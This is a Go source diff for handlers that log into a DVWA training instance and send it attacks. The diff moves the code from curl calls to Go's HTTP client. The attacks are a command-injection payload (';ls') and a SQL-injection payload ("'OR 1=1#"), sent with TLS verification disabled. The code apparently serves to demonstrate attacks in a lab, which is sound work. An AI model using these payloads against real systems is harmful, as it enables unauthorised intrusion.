@@ -97,11 +97,6 @@ func handleCommandInjectionAction(c echo.Context) error {
 		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
 	}
 
-	// Debug
-	log.Printf("HTTP response code: %d", resp.StatusCode)
-	log.Printf("HTTP response headers: %v", resp.Header)
-	log.Printf("Cookies: %v", jar.Cookies(req.URL))
-
 	// Execute Command Injection
 	data = url.Values{
 		"ip":     {";ls"},
@@ -130,18 +125,13 @@ func handleCommandInjectionAction(c echo.Context) error {
 
 	defer resp.Body.Close()
 
-	output2, err := ioutil.ReadAll(resp.Body)
+	output, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
 		return c.String(http.StatusInternalServerError, err.Error())
 	}
 
-	// Debug
-	log.Printf("HTTP response code: %d", resp.StatusCode)
-	log.Printf("HTTP response headers: %v", resp.Header)
-	log.Printf("Cookies: %v", jar.Cookies(req.URL))
-
 	// Return the HTML content
-	return c.HTML(http.StatusOK, string(output2))
+	return c.HTML(http.StatusOK, string(output))
 }
 
 ///////////////////////////////////////////////////////////////////////////////////
@@ -150,52 +140,91 @@ func handleCommandInjectionAction(c echo.Context) error {
 
 func handleSQLInjectionAction(c echo.Context) error {
 	username := c.FormValue("username")
-
 	password, ok := UserPassMap[username]
+
 	if !ok {
 		return c.String(http.StatusBadRequest, "Invalid username")
 	}
 
-	// Perform Authentication
-	cmd := exec.Command("curl", DVWA_URL+"/login.php",
-		"-H", "authority: "+DVWA_HOST,
-		"-H", "cache-control: max-age=0",
-		"-H", "content-type: application/x-www-form-urlencoded",
-		"-H", "origin: "+DVWA_URL,
-		"-H", "referer: "+DVWA_URL+"/",
-		"-H", "user-agent: "+USER_AGENT,
-		"--insecure",
-		"--silent",
-		"--data-raw", "username="+username+"&password="+password+"&Login=Login",
-		"-c", "cookie.txt",
-	)
-
-	output, err := cmd.CombinedOutput()
+	jar, err := cookiejar.New(nil)
 	if err != nil {
 		return c.String(http.StatusInternalServerError, err.Error())
 	}
+
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+
+	client := &http.Client{
+		Transport: transport,
+		Jar:       jar,
+	}
+
+	// Perform Authentication
+	data := url.Values{
+		"username": {username},
+		"password": {password},
+		"Login":    {"Login"},
+	}
+
+	req, err := http.NewRequest("POST", DVWA_URL+"/login.php", strings.NewReader(data.Encode()))
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Set Headers for the request
+	req.Header.Set("authority", DVWA_HOST)
+	req.Header.Set("origin", DVWA_URL)
+	req.Header.Set("referer", DVWA_URL+"/")
+	req.Header.Set("user-agent", USER_AGENT)
+	req.Header.Set("cache-control", "max-age=0")
+	req.Header.Set("content-type", "application/x-www-form-urlencoded")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
+	}
+
+	defer resp.Body.Close()
 
 	// Execute SQL Injection
-	cmd2 := exec.Command("curl", DVWA_URL+"/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit",
-		"-H", "authority: "+DVWA_HOST,
-		"-H", "cache-control: max-age=0",
-		"-H", "content-type: application/x-www-form-urlencoded",
-		"-H", "origin: "+DVWA_URL,
-		"-H", "referer: "+DVWA_URL+"/index.php",
-		"-H", "user-agent: "+USER_AGENT,
-		"--insecure",
-		"--silent",
-		"-b", "cookie.txt",
-	)
-
-	output2, err := cmd2.CombinedOutput()
+	req, err = http.NewRequest("GET", DVWA_URL+"/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit", nil)
 	if err != nil {
 		return c.String(http.StatusInternalServerError, err.Error())
 	}
 
-	// Return the HTML content of the two curl command
-	return c.HTML(http.StatusOK, string(output)+"\n"+string(output2))
+	// Set Headers for the request
+	req.Header.Set("authority", DVWA_HOST)
+	req.Header.Set("origin", DVWA_URL)
+	req.Header.Set("referer", DVWA_URL+"/index.php")
+	req.Header.Set("user-agent", USER_AGENT)
+	req.Header.Set("cache-control", "max-age=0")
+	req.Header.Set("content-type", "application/x-www-form-urlencoded")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+	req.Header.Set("Connection", "keep-alive")
+	req.Header.Set("Upgrade-Insecure-Requests", "1")
 
+	resp, err = client.Do(req)
+	if err != nil {
+		return c.HTML(http.StatusOK, `<pre style="color: red; font-family: 'Courier New', monospace; white-space: pre-wrap;">The Virtual Server is not reachable</pre>`)
+	}
+
+	defer resp.Body.Close()
+
+	output, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return c.String(http.StatusInternalServerError, err.Error())
+	}
+
+	// Return the HTML content
+	return c.HTML(http.StatusOK, string(output))
 }
 
 ///////////////////////////////////////////////////////////////////////////////////
